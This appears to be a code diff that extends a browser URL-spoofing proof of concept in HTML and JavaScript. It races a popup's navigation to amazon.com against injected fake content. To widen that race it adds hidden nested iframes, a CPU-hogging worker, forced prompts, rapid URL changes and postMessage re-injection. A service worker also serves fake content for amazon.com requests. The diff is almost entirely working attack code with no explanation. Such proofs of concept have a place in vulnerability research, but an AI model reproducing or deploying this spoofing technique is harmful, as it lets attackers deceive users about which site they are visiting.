@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Enhanced Spoof PoC</title>
+    <title>Further Enhanced Spoof PoC</title>
   </head>
   <body>
     <a id="test" href="https://www.amazon.com/" onclick="foo()"
@@ -13,27 +13,45 @@
     var animationFrameId;
 
     if (location.href.indexOf("fake") !== -1) {
+      // Enhanced fake page with nested iframes to complicate eviction
       document.body.innerHTML =
-        "<h1>This website has moved to http://fake.com</h1>";
+        "<h1>This website has moved to http://fake.com</h1><div id='nested'></div>";
+      // Add nested iframes for deeper rendering complexity
+      const nestedDiv = document.getElementById("nested");
+      for (let i = 0; i < 3; i++) {
+        // 3-level nesting
+        let iframe = document.createElement("iframe");
+        iframe.srcdoc = `<h1>Nested Fake Level ${
+          i + 1
+        }</h1><iframe srcdoc="<h1>Deeper Fake</h1>"></iframe>`;
+        iframe.style = "display:none";
+        nestedDiv.appendChild(iframe);
+      }
+      // Add event listener to re-inject if content cleared
+      window.addEventListener("load", () => {
+        if (!document.body.innerHTML.includes("fake.com")) {
+          document.body.innerHTML =
+            "<h1>This website has moved to http://fake.com</h1>";
+        }
+      });
     }
 
     function foo() {
       document.getElementById("test").href = "#";
       w = window.open("?fake");
-      // Use requestAnimationFrame instead of setInterval for better sync with render cycle
       animationFrameId = requestAnimationFrame(bar);
     }
 
     function bar() {
       if (w.location.href !== "about:blank") {
-        alert("Redirecting");
+        alert("Redirecting"); // Existing alert for interaction
+        // Add prompt for user interaction delay to widen race (bypass paint timers)
+        prompt("Confirm redirection? (This delays paint for race condition)");
         document.body.innerHTML = "<h1>Redirecting</h1>";
         slow();
         w.location.href = "https://www.amazon.com/";
-        // Start baz with requestAnimationFrame
         animationFrameId = requestAnimationFrame(baz);
       } else {
-        // Continue looping if not ready
         animationFrameId = requestAnimationFrame(bar);
       }
     }
@@ -41,37 +59,59 @@
     function baz() {
       try {
         w.location.href !== "about:blank";
-        // Continue checking
         animationFrameId = requestAnimationFrame(baz);
       } catch (e) {
-        // Simulate tab switch to exploit occlusion
+        // Simulate tab switch
         w.blur();
-        setTimeout(() => w.focus(), 50); // Short delay to mimic switch
+        setTimeout(() => w.focus(), 50);
 
-        // Stop page loading with slower 204 endpoint
-        w.location.href = "https://httpstat.us/204?sleep=200"; // Slower alternative for wider race window
+        // Slower 204 endpoint
+        w.location.href = "https://httpstat.us/204?sleep=200";
 
-        // Chain interruption with data URI for additional no-paint force
+        // Modified chain: Use a non-blank data URI with minimal content to avoid full clear
         setTimeout(() => {
-          w.location.href = "data:text/html,<h1>Blank</h1>";
+          w.location.href = "data:text/html,<span></span>"; // Empty span to prevent blank page
         }, 100);
 
-        // Cancel animation frame
+        // Continuous URL update to mimic new issue (continuous spoofing)
+        let updateCount = 0;
+        const updateInterval = setInterval(() => {
+          if (updateCount < 5) {
+            // Limit to avoid infinite loop
+            w.location.href = `https://www.amazon.com/?spoof=${updateCount}`; // Variant URL to confuse bar update
+            updateCount++;
+          } else {
+            clearInterval(updateInterval);
+          }
+        }, 50);
+
+        // PostMessage for cross-window injection post-redirect
+        setTimeout(() => {
+          w.postMessage(
+            { action: "inject", html: "<h1>Re-injected Fake Content</h1>" },
+            "*"
+          );
+        }, 150);
+
         cancelAnimationFrame(animationFrameId);
       }
     }
 
-    // Enhanced slowdown: More iframes + CPU-intensive loop with Web Worker
+    // Add listener for postMessage in main script (for fake window to receive)
+    window.addEventListener("message", (event) => {
+      if (event.data.action === "inject") {
+        document.body.innerHTML = event.data.html;
+      }
+    });
+
     function slow() {
       for (let i = 0; i < 100; i++) {
-        // Increased to 100 iframes for heavier load
         let iframe = document.createElement("iframe");
-        iframe.src = "https://www.amazon.com/"; // Or use a heavier site if needed
+        iframe.src = "https://www.amazon.com/";
         iframe.style = "display:none";
         document.body.appendChild(iframe);
       }
 
-      // Web Worker for multi-threaded CPU hog to widen race window
       const workerCode = `
         onmessage = () => {
             let a = 0, b = 1;
@@ -87,38 +127,46 @@
       const blob = new Blob([workerCode], { type: "application/javascript" });
       const worker = new Worker(URL.createObjectURL(blob));
       worker.postMessage("start");
-      worker.onmessage = () => worker.terminate(); // Terminate after ~200ms
+      worker.onmessage = () => worker.terminate();
 
-      // Additional busy-wait fallback
       let start = performance.now();
-      while (performance.now() - start < 100) {} // ~100ms busy-wait
+      while (performance.now() - start < 100) {}
     }
 
-    // Optional: Service Worker for persistent cache (requires server setup or local testing)
-    // If testing locally, save this as sw.js and register
+    // Enhanced Service Worker: Cache fake content more robustly
     if ("serviceWorker" in navigator && location.href.indexOf("fake") === -1) {
+      const swCode = `
+        self.addEventListener('install', event => {
+            event.waitUntil(
+                caches.open('spoof-cache').then(cache => {
+                    return cache.addAll([
+                        new Request('https://www.amazon.com/', {
+                            method: 'GET',
+                            headers: {'Content-Type': 'text/html'},
+                            body: '<h1>Cached Fake Content from SW</h1>'
+                        })
+                    ]);
+                })
+            );
+        });
+
+        self.addEventListener('fetch', event => {
+            if (event.request.url.includes('amazon.com')) {
+                event.respondWith(
+                    caches.match('https://www.amazon.com/').then(response => {
+                        return response || fetch(event.request);
+                    })
+                );
+            }
+        });
+    `;
       navigator.serviceWorker
         .register(
           URL.createObjectURL(
-            new Blob(
-              [
-                `
-        self.addEventListener('fetch', event => {
-            if (event.request.url.includes('amazon.com')) {
-                event.respondWith(new Response('<h1>Fake Cached Content</h1>', {
-                    headers: {'Content-Type': 'text/html'}
-                }));
-            }
-        });
-    `,
-              ],
-              { type: "application/javascript" }
-            )
+            new Blob([swCode], { type: "application/javascript" })
           )
         )
-        .then((reg) => {
-          console.log("SW registered");
-        })
+        .then((reg) => console.log("SW registered"))
         .catch((err) => console.error("SW error", err));
     }
   </script>
